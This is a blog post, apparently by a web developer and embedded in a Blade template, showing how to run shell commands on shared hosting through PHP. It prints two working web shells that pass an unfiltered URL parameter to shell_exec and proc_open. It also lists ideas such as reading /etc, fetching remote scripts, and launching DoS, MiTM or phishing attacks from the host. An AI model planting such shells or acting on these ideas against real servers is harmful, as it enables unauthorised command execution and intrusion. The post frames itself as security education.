@php
    $id = 'blog.blog-8';
    $title = 'Running Shell Commands Within Shared Hosting | My Blog';
    $description = 'In a previous article, I discussed shared hosting. In this one, I\'ll be experimenting with a shared hosting server. My goal is to highlight a vulnerability a...';
    $keywords = 'enindu, enindu alahapperuma, freelancer, software engineer, sri lanka, back-end engineer, system administrator, website security expert';
@endphp

@extends('components.layouts.base')
@section('content')
    <div class="card rounded-5 p-3">
        <div class="card-body">
            <div class="d-flex flex-column gap-3">
                <h1 class="mb-0">Running Shell Commands Within Shared Hosting</h1>
                <p class="mb-0">In a previous article, I discussed shared hosting. In this one, I'll be experimenting with a shared hosting server. My goal is to highlight a vulnerability and help you approach certain aspects from a different perspective. Let's get started!</p>
            </div>
        </div>
    </div>
    <div class="card rounded-5 p-3">
        <div class="card-body">
            <div class="d-flex flex-column gap-3">
                <p class="mb-0">I'm not sure if some shared hosting providers restrict these actions, but the one I use doesn't impose any limitations. Keep that in mind. The vulnerability I'm discussing (To some extent) applies to the shared server I use. Even if your provider doesn't restrict this, you could still lose your hosting account due to their terms of service. Additionally, if someone has access to your subdomain and knows how to run shell commands in the browser, they may be able to modify or delete your data. I'm not responsible for any consequences that arise. This could be considered illegal activity, and I'm sharing this for educational purposes only. My intention is not to teach hacking or promote illegal behavior. You're responsible for your actions. If you still wish to explore these techniques, I recommend using a local server that you control.</p>
                <p class="mb-0">Most shared hosting providers offer a LAMP stack (Linux, Apache, MySQL, PHP) along with cPanel. This means that on most shared hosting platforms, you can run PHP programs. To get started, log in to the cPanel of your shared hosting account, create a subdomain, and then navigate to the subdomain's directory using the file manager. Next, create a file named index.php and paste below script. When you visit the subdomain in your browser, the script will execute, and you'll see the output of the code.</p>
                <pre class="font-monospace border rounded-4 mb-0 p-3"><code>&lt;?php

echo phpinfo();</code></pre>
                <p class="mb-0">By viewing the output, you can gain valuable insights into the system as well as the PHP configuration. The output will display paths to certain files, which you can explore if desired. To do this, you can either write a custom PHP script or use shell commands within a PHP script—personally, I prefer the latter because it's simpler and more efficient.</p>
                <p class="mb-0">I'll go with the second option, but before doing anything, let's first determine which shell commands are disabled by the service provider. To do this, search for the disable_functions parameter in the core section of the PHP configuration. Any commands listed under the disable_functions parameter cannot be executed within the shell_exec function.</p>
                <p class="mb-0">Here's the code I came up with for the second option.</p>
                <pre class="font-monospace border rounded-4 mb-0 p-3"><code>&lt;?php

header('Content-Type: text/plain');

$command = $_GET['c'];

if (!isset($command)) {
   echo 'No command found';
   return;
}

echo shell_exec($command);</code></pre>
                <p class="mb-0">So, what does this code do? Add it to the index.php file and visit the subdomain in your browser. At first glance, you'll see a "No command found" message. You can then enter any valid command for your shared hosting environment as a query parameter in the URL, like sub.domain.com?c=ls. Essentially, we've created a terminal (Well, sort of) for your shared hosting, even if you don't have one in cPanel. Thank me later. Before proceeding, take some time to experiment with it, but do so with caution. As I mentioned, you're on your own.</p>
                <p class="mb-0">If you're able to run shell commands within PHP on your shared hosting, even if the operating system is isolated from other environments, it's a potential security issue. This indicates that the shared hosting is poorly configured. As I mentioned in my previous article, if isolation is also poorly configured, it could allow access to other files within the shared hosting environment.</p>
                <p class="mb-0">The shell_exec function only handles basic executions and doesn't manage stdin, stdout, and stderr properly. So, let's create another script that will handle stdin, stdout, and stderr for us. This will work almost like a terminal.</p>
                <pre class="font-monospace border rounded-4 mb-0 p-3"><code>&lt;?php

header('Content-Type: text/plain');

$command = $_GET['c'];

if (!isset($command)) {
   echo 'No command found';
   return;
}

$command = 'script -q -c "' . $command . '" /dev/null';

$descriptorSpec = [
   0 => ['pipe', 'r'],
   1 => ['pipe', 'w'],
   2 => ['pipe', 'w'],
];

$envVars = [
   'TERM' => 'xterm',
   'SHELL' => '/bin/bash',
];

$process = proc_open($command, $descriptorSpec, $pipes, null, $envVars);

if (is_resource($process)) {
   // Handle stdin
   // I close the stdin as I don't use it
   fclose($pipes[0]);

   // Handle stdout
   $stdout = stream_get_contents($pipes[1]);

   fclose($pipes[1]);

   // Handle stderr
   $stderr = stream_get_contents($pipes[2]);

   fclose($pipes[2]);
   proc_close($process);

   echo $stdout;
   echo $stderr;
   return;
}

echo 'Something went wrong';</code></pre>
                <p class="mb-0">As in the previous example, you can use shell commands in a URL query. This code will work fine with some shell commands and handle errors effectively. However, if you run commands that expect real-time stdout and stderr, the code won't execute as expected. This is because HTTP requests and responses are a one-time process. To handle real-time communication, you'll need to create an interactive terminal using WebSockets instead of HTTP. I recommend using WebSockets, as they are ideal for real-time communication. Alternatively, you can use less modern techniques like AJAX to achieve this.</p>
                <p class="mb-0">However, I'm not going to cover this part in detail, as my goal is not to give you the entire idea at once. You should explore it on your own. There are plenty of possibilities for you to discover. Here are 5 examples you can try out.</p>
                <ul class="mb-0 ps-3">
                    <li>You can explore directories like /proc or /etc to gather system information and configuration details.</li>
                    <li>Since you might encounter difficulties with this approach, you can write custom shell scripts to handle specific tasks outside of PHP execution and run those scripts directly from PHP. You could even run other shell scripts from external servers with proper configuration. It's like having a shell-over-HTTP setup.</li>
                    <li>You can install external software using this approach and run them within shell commands.</li>
                    <li>You can use this shared hosting to experiment with a wide range of attacks, such as DoS, MiTM, phishing, and more. Additionally, you can host external websites within your subdomain by using curl and configuring HTTP headers in the PHP script.</li>
                    <li>You can explore the isolation methods and attempt to exploit them using specific techniques.</li>
                </ul>
                <p class="mb-0">So, the most important question is: can we only do this on shared hosting? Absolutely not. You can perform similar actions on any hosting that supports PHP. The main downside of shared hosting is that you don't have full access to the system. This means you can't restrict actions that could allow other users on the same hosting platform to exploit vulnerabilities, leaving your data exposed—unless the service provider addresses these security issues.</p>
                <p class="mb-0">On the other hand, with managed hosting like cloud servers, you don't have to worry about external users. You have full control over the system, which means you can fine-tune any security issues and configure the environment to your needs, enhancing overall security.</p>
                <p class="mb-0">Now, let me talk about perspective. This is just a simple code that almost any PHP developer, even a beginner, is familiar with. But how many of you think about it from a different perspective? That's why I always say, it's not just about the knowledge you have. You have the knowledge, and everyone has access to that. The key is to think differently and reason with yourself, as well as with others. I agree with clean coding and other best practices, but thinking outside the box can often lead to solutions that are faster and more accurate. This is the type of programming I know.</p>
                <p class="mb-0">You can find the codes I used in this article at the following link: <a class="text-decoration-none" href="https://github.com/enindu/examples-for-blog/tree/master/running-shell-commands-within-shared-hosting" target="_blank">https://github.com/enindu/examples-for-blog/tree/master/running-shell-commands-within-shared-hosting</a>.</p>
            </div>
        </div>
    </div>
@endsection
